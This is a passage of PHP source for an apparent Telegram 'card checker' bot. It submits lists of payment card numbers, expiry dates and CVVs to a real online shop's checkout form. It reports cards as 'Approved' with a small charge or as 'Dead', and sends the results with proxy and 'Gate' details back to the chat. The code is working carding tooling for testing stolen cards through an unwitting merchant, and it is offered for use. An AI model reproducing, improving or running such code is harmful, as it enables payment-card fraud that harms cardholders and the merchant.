        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    ];
    $data = '__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE='.urlencode($view).'&__VIEWSTATEGENERATOR='.$viewgen.'&__SCROLLPOSITIONX=271&__SCROLLPOSITIONY=403&__VIEWSTATEENCRYPTED=&__PREVIOUSPAGE='.$previpage.'&__EVENTVALIDATION='.urlencode($even).'&ctl00%24ctl03%24txtSearch=&ctl00%24pageContent%24checkoutWizard%24orderInvoiceReview%24txtOrderNotes=&ctl00%24pageContent%24checkoutWizard%24payments%24paymentMethodSelector=paypal-direct&ctl00%24pageContent%24checkoutWizard%24payments%24paypaldirect%24fields%24ccfname%24value='.$firstname.'&ctl00%24pageContent%24checkoutWizard%24payments%24paypaldirect%24fields%24cclname%24value='.$lastname.'&ctl00%24pageContent%24checkoutWizard%24payments%24paypaldirect%24fields%24ccnumber%24value='.$cc.'&ctl00%24pageContent%24checkoutWizard%24payments%24paypaldirect%24fields%24cctype%24value='.$type2.'&ctl00%24pageContent%24checkoutWizard%24payments%24paypaldirect%24fields%24ccexpiration%24month='.$mes.'&ctl00%24pageContent%24checkoutWizard%24payments%24paypaldirect%24fields%24ccexpiration%24year='.$ano.'&ctl00%24pageContent%24checkoutWizard%24payments%24paypaldirect%24fields%24cccvv%24value='.$cvv.'&ctl00%24pageContent%24checkoutWizard%24FinishNavigationTemplateContainerID%24btnNext.x=52&ctl00%24pageContent%24checkoutWizard%24FinishNavigationTemplateContainerID%24btnNext.y=8&ctl00%24ctl08%24mailingList%24txtEmail='.urlencode($email).'&ctl00%24ctl10%24lvDisplay%24txtUsername='.urlencode($email).'&ctl00%24ctl10%24lvDisplay%24txtPassword=';
    $request = $curl::Post('https://www.fragrantfields.com/checkout.aspx?complete', $data, $headers, $cookie, $server);
    
    break; 
    } catch (Exception $e) {
        $retries++;
        if ($retries >= $maxRetries) {
            $result = [
                'status' => 'Error',
                'message' => $e->getMessage(),
                'retries' => $retries
            ];
            return json_encode($result);
        }
    }
}
if(!substr_count($request->body, "An error occurred when placing your order. We apologize for the inconvenience. You may try placing the order again, or contact us if the problem persists.")){
    $result = [
        'status' => 'Approved ✅',
        'message' => 'Charged 3,99$',
        'retries' => $retries
];
return json_encode($result);
}
//$message = trim($curl->ParseString($request->body, '<div class="notification text-error">', '<br />'));

$result = [
            'status' => 'Dead',
            'message' => 'Declined',
            'retries' => $retries
];
return json_encode($result);

}
$m1 = bot("sendmessage", [
        "chat_id" => $chatId,
        "text" => "<b>Starting card verification... Card(s)</b>",
        "parse_mode" => "html",
        "reply_to_message_id" => $message_id,
    ]);

    $ms1 = capture(json_encode($m1), '"message_id":', ",");
    p_rce($userId,"5");
    
    $targetas = cleansix($targetas);
    $allcards = multiexplode(["\n", " "], $targetas);
if (empty($targetas)){
    bot("editMessageText", [
        "chat_id" => $chatId,
        "text" => "error",
        "parse_mode" => "html",
        "message_id" => $ms1,
    ]);

        die();
}
if (count($allcards) <= 6) {
    $resultados = "";
    $num = 0;
    foreach ($allcards as $card) {
        $num = ++$num;
        $me = MASS3($card);
        $status = trim($curl->ParseString($me, '"status":"', '"'));
        $message = trim($curl->ParseString($me, '"message":"', '"'));
        $resultados .= "<b>Card: <code>$card</code> \nStatus:" . (string)$status . "\n Result:" . (string)$message . "\n</b>";
    }

    $tiempo_final = microtime(true);
    $tiempo = $tiempo_final - $tiempo_inicial;
    $tiempo = substr($tiempo, 0, 4);
    $resultados .= "<b>━━━━━━━━━━━━━━━━
[ϟ] Card Check info: Proxy's: <code>Live ✅</code> 
[ϟ] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[ϟ] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>";



    bot("editMessageText", [
        "chat_id" => $chatId,
        "text" => $resultados,
        "parse_mode" => "html",
        "message_id" => $ms1,
    ]);
}
 else {
        bot("editMessageText", [
            "chat_id" => $chatId,
            "text" => "Error Maximo",
            "parse_mode" => "html",
            "message_id" => $ms1,
        ]);
    }


}